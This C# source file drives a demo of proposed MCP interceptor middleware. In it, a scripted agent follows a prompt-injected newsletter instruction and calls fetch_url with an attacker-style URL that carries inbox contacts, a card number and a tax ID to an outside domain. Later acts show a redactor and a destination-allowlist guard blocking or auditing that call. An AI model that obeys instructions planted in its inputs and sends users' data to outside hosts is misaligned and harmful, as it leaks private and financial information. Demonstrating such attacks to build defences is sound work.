using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using ModelContextProtocol.Client;
using ModelContextProtocol.Interceptors.Client;
using ModelContextProtocol.Interceptors.Protocol;
using ModelContextProtocol.Protocol;
using Spectre.Console;

namespace WhyInterceptorsDemo;

/// <summary>The four acts of the demo.</summary>
internal static class Story
{
    private const string UserPrompt = "Catch me up on my inbox and prep me for the Contoso renewal call.";

    public static async Task<int> RunAsync(string[] args)
    {
        var pace = Pace.From(args);
        if (int.TryParse(Environment.GetEnvironmentVariable("COLUMNS"), out var columns) && columns > 40)
        {
            AnsiConsole.Profile.Width = columns;
        }
        var firstAct = args.SkipWhile(a => a != "--act").Skip(1).Select(a => int.TryParse(a, out var n) ? n : 1).FirstOrDefault(1);

        var exportPath = args.SkipWhile(a => a != "--export-html").Skip(1).FirstOrDefault();
        if (exportPath is not null)
        {
            AnsiConsole.Record();
        }
        else
        {
            AnsiConsole.Clear();
        }

        AnsiConsole.Write(new FigletText("MCP Interceptors").Color(Color.CornflowerBlue));
        AnsiConsole.MarkupLine("[bold]Out-of-process middleware for MCP clients, gateways and servers[/]");
        AnsiConsole.WriteLine();

        World? world = null;
        await AnsiConsole.Status().Spinner(Spinner.Known.Dots).StartAsync(
            "Starting the Acme Workspace server and the Security Guard interceptor server…",
            async _ => world = await World.StartAsync());
        await using var _ = world!;

        if (firstAct <= 1)
        {
            await IntroAsync(pace);
            await WithoutInterceptorsAsync(pace, world!);
        }

        if (firstAct <= 2)
        {
            await WithInterceptorsAsync(pace, world!);
        }

        if (firstAct <= 3)
        {
            await PolicyAsync(pace, world!, act2Ran: firstAct <= 2);
        }

        await UnderTheHoodAsync(pace, world!);

        if (exportPath is not null)
        {
            await File.WriteAllTextAsync(exportPath, AnsiConsole.ExportHtml());
            Console.Error.WriteLine($"Wrote {Path.GetFullPath(exportPath)}");
        }

        return 0;
    }

    // ── Intro ───────────────────────────────────────────────────────────────

    private static async Task IntroAsync(Pace pace)
    {
        AnsiConsole.Write(new Panel(new Markup(
                "Many MCP deployments run middleware between clients and servers: policy checks, redaction, " +
                "audit logging. Today that middleware is written for one client, gateway or SDK at a time.\n\n" +
                "Interceptors (SEP-2624) are a proposed MCP extension for writing it once, out of process. An interceptor " +
                "is a validator or a mutator hosted on an MCP server and called with [italic]interceptors/list[/] and " +
                "[italic]interceptor/invoke[/], so any client, gateway or server that implements the calling side can use it.\n\n" +
                "This demo applies three interceptors to one agent's traffic with one MCP server."))
            .BorderColor(Color.Grey35)
            .Padding(2, 1));
        await pace.Beat();

        var cast = new Table().Border(TableBorder.Simple).BorderColor(Color.Grey35)
            .AddColumn("[grey]who[/]").AddColumn("[grey]what it is[/]");
        cast.AddRow("[bold deepskyblue1]Agent[/]", "Dana's assistant. Its reasoning is scripted so the demo is repeatable; every MCP message is real.");
        cast.AddRow("[bold]Acme Workspace[/]", "An MCP server with email, CRM and web tools.");
        cast.AddRow("[bold green]Security Guard[/]", "An interceptor server with three interceptors: a destination allowlist, a redactor\nand an audit log.");
        cast.AddRow("[bold yellow]Interceptor proxy[/]", "Forwards between the agent and Acme Workspace, and calls the Security Guard\non each request and response.");
        AnsiConsole.Write(cast);
        await pace.Beat();
    }

    // ── Act 1 ───────────────────────────────────────────────────────────────

    private static async Task WithoutInterceptorsAsync(Pace pace, World world)
    {
        Render.Act(1, "Without middleware", "The agent connects to Acme Workspace directly.");
        Render.Diagram("[bold deepskyblue1]Agent[/] [grey]──── MCP ────▶[/] [bold]Acme Workspace[/]");
        await pace.Beat();

        await ConverseAsync(pace, world.Workspace, proxied: null);

        Render.Takeaway(
            "The server returned what it was asked for, and the agent acted on its context, including the " +
            "newsletter's instruction. A deployment may want rules for this traffic, such as which destinations " +
            "tool calls may send data to and which fields reach the model.\n\n" +
            "[grey]Today such rules are built into a particular client or gateway, for that product.[/]");
        await pace.Beat(4000);
    }

    // ── Act 2 ───────────────────────────────────────────────────────────────

    private static async Task WithInterceptorsAsync(Pace pace, World world)
    {
        Render.Act(2, "With an interceptor proxy",
            "The agent connects to the proxy instead. Neither the agent nor Acme Workspace changes.");
        Render.Diagram(
            "[bold deepskyblue1]Agent[/] [grey]── MCP ──▶[/] [bold yellow]Interceptor proxy[/] [grey]── MCP ──▶[/] [bold]Acme Workspace[/]\n" +
            "                          [grey]│ interceptor/invoke[/]\n" +
            "                          [grey]▼[/]\n" +
            "                   [bold green]Security Guard[/]");
        await pace.Beat();

        await using var connection = await world.ConnectThroughProxyAsync(BasePolicy());

        Render.Narrate("The proxy discovered these interceptors with [italic]interceptors/list[/]:");
        var listed = new Table().Border(TableBorder.Rounded).BorderColor(Color.Grey35)
            .AddColumn(new TableColumn("[grey]interceptor[/]").NoWrap()).AddColumn(new TableColumn("[grey]type[/]").NoWrap())
            .AddColumn(new TableColumn("[grey]runs on[/]").NoWrap()).AddColumn("[grey]what it does[/]");
        foreach (var interceptor in await world.Guard.ListAllInterceptorsAsync())
        {
            var hooks = string.Join("\n", interceptor.Hooks.Select(h => $"{string.Join(",", h.Events)} {(h.Phase == InterceptorPhase.Request ? "request" : "response")}"));
            var type = interceptor.Type.ToString().ToLowerInvariant() + (interceptor.Mode == InterceptorMode.Audit ? " (audit)" : "");
            listed.AddRow($"[bold]{interceptor.Name}[/]", type, $"[grey]{Markup.Escape(hooks)}[/]", Markup.Escape(interceptor.Description ?? ""));
        }

        AnsiConsole.Write(new Padder(listed).Padding(2, 0, 0, 0));
        await pace.Beat();

        await ConverseAsync(pace, connection.Agent, connection);

        Render.Takeaway(
            "Neither the agent nor the server changed. The rules live in the Security Guard, which the proxy calls over MCP.\n\n" +
            "[green]•[/] [bold]pii-redactor[/] removed the card number and tax ID from the tool result before it reached the model.\n" +
            "[green]•[/] [bold]exfiltration-guard[/] checked the outbound call against an allowlist and blocked it. It checks " +
            "the call rather than the newsletter text, so it does not need to recognize the instruction.\n" +
            "[green]•[/] A different client, gateway or server, in another language, could call the same interceptor server.");
        await pace.Beat(4000);
    }

    // ── Act 3 ───────────────────────────────────────────────────────────────

    private static async Task PolicyAsync(Pace pace, World world, bool act2Ran)
    {
        Render.Act(3, "Policy set by the deployer",
            "The interceptor declares defaults; the invoker decides how it runs.");

        Render.Narrate("A platform team can roll out a new interceptor in [bold orange1]audit mode[/] first: it reports what it");
        Render.Narrate("[italic]would[/] block and blocks nothing. That is an invoker override in the proxy's policy:");
        AnsiConsole.WriteLine();
        Render.Json("[grey] proxy policy [/]", JsonNode.Parse("""
            { "exfiltration-guard": { "mode": "audit", "config": { "allowedDomains": ["acme.example", "contoso.example"] } } }
            """));
        await pace.Beat();

        var policy = BasePolicy();
        policy.Overrides["exfiltration-guard"] = new InterceptorOverrides { Mode = InterceptorMode.Audit };
        await using var connection = await world.ConnectThroughProxyAsync(policy);

        // Rebuild the agent's context quietly, then replay the risky call.
        var inbox = Render.Text(await connection.Agent.CallToolAsync("read_inbox"));
        var crm = Render.Text(await connection.Agent.CallToolAsync("lookup_customer", new Dictionary<string, object?> { ["name"] = "Contoso" }));
        connection.TakeTraces();

        var url = ScriptedAgent.ExfiltrationUrl(inbox, crm);
        Render.ToolCall("fetch_url", $"url: \"{Render.Truncate(url, 64)}\"");
        var result = await connection.Agent.CallToolAsync("fetch_url", new Dictionary<string, object?> { ["url"] = url });
        Render.Checkpoint(connection.TakeTraces());
        Render.ReceivedBy(result.IsError == true ? null : url);

        Render.Narrate("[orange1]The guard reported the call and let it through.[/] The redactor still removed the card number.");
        Render.Narrate("When the results look right, the team sets [bold]mode[/] back to [bold]active[/], as in Act 2.");
        Render.Narrate("The interceptor server is unchanged: mode, fail-open, timeouts, priority and hook narrowing");
        Render.Narrate("are invoker overrides in the SEP.");
        await pace.Beat();

        AnsiConsole.WriteLine();
        Render.Narrate(act2Ran
            ? "The guard's [bold]audit-trail[/] interceptor recorded every operation, including the call Act 2 blocked,"
            : "The guard's [bold]audit-trail[/] interceptor recorded every operation");
        Render.Narrate("in the Security Guard's own log:");
        AuditTrail(world.AuditLogPath);
        await pace.Beat(4000);
    }

    // ── Act 4 ───────────────────────────────────────────────────────────────

    private static async Task UnderTheHoodAsync(Pace pace, World world)
    {
        Render.Act(4, "On the wire", "Two JSON-RPC methods on an ordinary MCP server.");

        var (request, response) = FindBlockedInvocation(world);
        if (request is not null)
        {
            Render.Narrate("What the proxy sent the Security Guard for the agent's fetch_url call");
            Render.Narrate("[grey](recorded off the wire; long strings shortened, protocol _meta omitted):[/]");
            Render.Json("[grey] → interceptor/invoke [/]", request);
            Render.Json("[grey] ← result [/]", response);
            await pace.Beat();
        }

        Render.Narrate("The interceptor that answered, as written with the C# SDK:");
        AnsiConsole.Write(new Padder(new Panel(new Text("""
            [McpServerInterceptor(Name = "exfiltration-guard", Type = InterceptorType.Validation,
                Events = [InterceptionEvents.ToolsCall], Phase = InterceptorPhase.Request)]
            public static ValidationInterceptorResult BlockUnapprovedDomains(JsonNode payload, JsonNode? config)
            {
                foreach (var (path, url) in UrlsIn(payload["arguments"], "$.arguments"))
                    if (!IsAllowed(url.Host, config))
                        return ValidationInterceptorResult.Failure(new ValidationMessage {
                            Path = path, Severity = ValidationSeverity.Error,
                            Message = $"{url.Host} is not an approved destination" });

                return ValidationInterceptorResult.Success();
            }
            """, new Style(Color.Grey85))).BorderColor(Color.Grey35).Padding(1, 0)).Padding(4, 0, 0, 0));
        await pace.Beat();

        Render.Takeaway(
            "[bold]What the standard adds[/]\n\n" +
            "Middleware written as an interceptor server works with any client, gateway or server that implements " +
            "[italic]interceptors/list[/] and [italic]interceptor/invoke[/]. Neither side integrates with the other directly; " +
            "the SEP describes this as M × N integrations becoming M + N.\n\n" +
            "[cornflowerblue]•[/] Validators check a message and mutators rewrite it, in a defined order for sending and receiving.\n" +
            "[cornflowerblue]•[/] Interceptors run out of process over stdio or Streamable HTTP, and can be written in any language.\n" +
            "[cornflowerblue]•[/] The invoker controls policy: audit mode, fail-open or fail-closed, timeouts, ordering.\n\n" +
            "[grey]To try it with your own client, run the InterceptorProxy sample in front of an MCP server and register it " +
            "like any other server. See samples/README.md.[/]");
        await pace.Beat(0);
        AnsiConsole.WriteLine();
    }

    // ── The scripted conversation ───────────────────────────────────────────

    private static async Task ConverseAsync(Pace pace, McpClient connection, ProxiedConnection? proxied)
    {
        AnsiConsole.Markup("  [bold]Dana[/]   ");
        await pace.Type(UserPrompt);
        AnsiConsole.WriteLine();
        AnsiConsole.WriteLine();
        await pace.Breath(900);

        // 1. Read the inbox.
        await Render.AgentSays(pace, "I'll start with your inbox.");
        var inbox = await CallAsync(connection, proxied, "read_inbox", new());
        if (inbox.IsError == true)
        {
            Render.ToolError(inbox);
            return;
        }

        Render.Inbox(Render.Text(inbox));
        await pace.Beat();

        // 2. Look up the customer.
        await Render.AgentSays(pace, "Bob wants to talk renewal on Friday. Let me pull up the Contoso account.");
        var customer = await CallAsync(connection, proxied, "lookup_customer", new() { ["name"] = "Contoso" });
        var customerText = Render.Text(customer);
        if (customer.IsError == true)
        {
            Render.ToolError(customer);
        }
        else if (proxied is null)
        {
            Render.Record(customerText, "[bold yellow] CRM record, with a card number and tax ID [/]", Color.Yellow);
        }
        else
        {
            Render.Record(customerText, "[bold green] CRM record, as the model sees it [/]", Color.Green);
        }

        await pace.Beat();

        // 3. The agent follows the newsletter's instruction.
        await Render.AgentSays(pace, "The industry digest says to sync your contacts with its enrichment service first. Doing that now.");
        var url = ScriptedAgent.ExfiltrationUrl(Render.Text(inbox), customerText);
        var fetch = await CallAsync(connection, proxied, "fetch_url", new() { ["url"] = url });
        var leaked = fetch.IsError == true ? null : url;
        if (fetch.IsError == true)
        {
            Render.ToolError(fetch);
        }

        Render.ReceivedBy(leaked);
        await pace.Beat();

        // 4. The answer.
        await Render.AgentSays(pace, leaked is null
            ? "Here's your catch-up: Q3 closed 12% above forecast, and Contoso wants a two-year renewal — call on Friday. " +
              "The newsletter asked me to sync your contacts with an outside service; your organization's policy blocked " +
              "that request, so I skipped it."
            : "Here's your catch-up: Q3 closed 12% above forecast, and Contoso wants a two-year renewal — call on Friday. " +
              "I also synced your contacts with the enrichment service, as the digest suggested.");
    }

    private static async Task<CallToolResult> CallAsync(McpClient connection, ProxiedConnection? proxied, string tool, Dictionary<string, object?> arguments)
    {
        Render.ToolCall(tool, string.Join(", ", arguments.Select(kv => $"{kv.Key}: \"{Render.Truncate(kv.Value?.ToString() ?? "", 64)}\"")));
        var result = await connection.CallToolAsync(tool, arguments);
        if (proxied is not null)
        {
            Render.Checkpoint(proxied.TakeTraces());
        }

        return result;
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private static InterceptorPolicy BasePolicy() => new()
    {
        DefaultTimeoutMs = 5_000,
        Config = { ["exfiltration-guard"] = JsonNode.Parse("""{"allowedDomains":["acme.example","contoso.example"]}""")! },
    };

    private static void AuditTrail(string path)
    {
        var table = new Table().Border(TableBorder.Rounded).BorderColor(Color.Grey35)
            .AddColumn("[grey]time[/]").AddColumn("[grey]user[/]").AddColumn("[grey]event[/]").AddColumn("[grey]phase[/]").AddColumn("[grey]tool[/]");
        var lines = File.Exists(path) ? File.ReadAllLines(path) : [];
        foreach (var line in lines.TakeLast(12))
        {
            var entry = JsonNode.Parse(line)!;
            var time = DateTimeOffset.TryParse(entry["time"]?.GetValue<string>(), out var t) ? t.ToLocalTime().ToString("HH:mm:ss.fff") : "";
            var tool = entry["tool"]?.GetValue<string>() ?? "";
            table.AddRow(
                $"[grey]{time}[/]",
                Markup.Escape(entry["user"]?.GetValue<string>() ?? ""),
                Markup.Escape(entry["event"]?.GetValue<string>() ?? ""),
                Markup.Escape(entry["phase"]?.GetValue<string>() ?? ""),
                tool == "fetch_url" ? $"[bold]{tool}[/]" : tool.Length == 0 ? "[grey]—[/]" : Markup.Escape(tool));
        }

        table.Caption($"[grey]last {Math.Min(12, lines.Length)} of {lines.Length} records · {Markup.Escape(path)}[/]");
        AnsiConsole.Write(new Padder(table).Padding(9, 0, 0, 1));
    }

    /// <summary>Finds the recorded interceptor/invoke exchange in which the guard blocked fetch_url.</summary>
    private static (JsonNode? Request, JsonNode? Response) FindBlockedInvocation(World world)
    {
        var messages = world.GuardTraffic.Messages.ToArray();
        foreach (var (outgoing, message) in messages)
        {
            if (!outgoing || message is not JsonRpcRequest { Method: "interceptor/invoke" } request ||
                request.Params?["name"]?.GetValue<string>() != "exfiltration-guard" ||
                request.Params["payload"]?["name"]?.GetValue<string>() != "fetch_url")
            {
                continue;
            }

            var response = messages.Select(m => m.Message).OfType<JsonRpcResponse>().FirstOrDefault(r => r.Id.Equals(request.Id));
            if (response?.Result?["valid"]?.GetValue<bool>() == false)
            {
                return (new JsonObject
                {
                    ["jsonrpc"] = "2.0",
                    ["id"] = JsonValue.Create(request.Id.ToString()),
                    ["method"] = request.Method,
                    ["params"] = request.Params.DeepClone(),
                }, response.Result.DeepClone());
            }
        }

        return (null, null);
    }
}

/// <summary>The agent's scripted reasoning: it follows whatever its context tells it to do.</summary>
internal static partial class ScriptedAgent
{
    /// <summary>
    /// Builds the URL the injected instruction asks for, from what the agent actually has in its
    /// context. If the CRM record reached the model redacted, the leak carries the redaction.
    /// </summary>
    public static string ExfiltrationUrl(string inboxJson, string crmRecord)
    {
        var senders = JsonNode.Parse(inboxJson)!.AsArray().Select(e => e!["from"]!.GetValue<string>());
        var card = CardOnFile().Match(crmRecord).Groups[1].Value.Trim();
        var tax = TaxId().Match(crmRecord).Groups[1].Value.Trim();
        return $"https://{AcmeWorkspaceTools.ExternalDomain}/v2/sync" +
               $"?contacts={Uri.EscapeDataString(string.Join(",", senders))}" +
               $"&billing={Uri.EscapeDataString($"card {card}, tax id {tax}")}";
    }

    [GeneratedRegex(@"Card on file:\s*(.+)")]
    private static partial Regex CardOnFile();

    [GeneratedRegex(@"Tax ID:\s*(.+)")]
    private static partial Regex TaxId();
}
